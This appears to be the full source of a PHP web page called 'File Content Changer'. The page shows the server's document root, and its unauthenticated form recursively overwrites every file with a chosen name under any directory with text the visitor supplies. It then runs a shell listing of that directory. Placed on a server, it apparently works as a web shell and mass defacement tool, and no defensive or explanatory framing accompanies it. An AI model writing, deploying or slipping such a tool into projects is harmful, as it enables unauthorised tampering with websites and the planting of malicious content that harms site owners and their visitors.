<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Content Changer</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            background-color: #222;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 600px;
        }
        input[type="text"], textarea, input[type="submit"], select {
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #fff;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
        }
        textarea {
            width: 100%;
            height: 150px;
        }
        input[type="submit"] {
            cursor: pointer;
        }
        .result {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php
        // Display the server document root path at the top of the page
        $documentRoot = $_SERVER['DOCUMENT_ROOT'];
        echo "<p>Document Root Path: $documentRoot</p>";
        ?>
        <h1>Change File Content</h1>
        <form method="post">
            <label for="directory">Directory Path:</label><br>
            <input type="text" id="directory" name="directory" required><br><br>
            <label for="filename">File Name to Search:</label><br>
            <input type="text" id="filename" name="filename" required><br><br>
            <label for="content">New Content:</label><br>
            <textarea id="content" name="content" required></textarea><br><br>
            <input type="submit" value="Change Content">
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $directory = $_POST['directory'];
            $filename = basename($_POST['filename']);
            $newContent = $_POST['content'];

            function changeContent($dir, $filename, $newContent) {
                $result = '';
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') {
                        continue;
                    }
                    $path = $dir . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($path)) {
                        $result .= changeContent($path, $filename, $newContent);
                    } else {
                        if (basename($path) == $filename) {
                            if (file_put_contents($path, $newContent) !== false) {
                                $result .= "Content changed for: $path<br>";
                            } else {
                                $result .= "Failed to change content for: $path<br>";
                            }
                        }
                    }
                }
                return $result;
            }

            // Validate and use the provided directory path
            $sanitizedDirectory = realpath($_POST['directory']);
            if ($sanitizedDirectory && is_dir($sanitizedDirectory)) {
                echo '<div class="result">';
                echo changeContent($sanitizedDirectory, $filename, $newContent);
                echo '</div>';

                // Display directory contents
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                    // For Windows
                    $files = shell_exec("dir " . escapeshellarg($sanitizedDirectory));
                } else {
                    // For Unix/Linux
                    $files = shell_exec("ls -l " . escapeshellarg($sanitizedDirectory));
                }
                echo '<div class="result">';
                echo "<h2>Directory Contents:</h2><pre>$files</pre>";
                echo '</div>';
            } else {
                echo '<div class="result">Invalid directory path.<br></div>';
            }
        }
        ?>
    </div>
</body>
</html>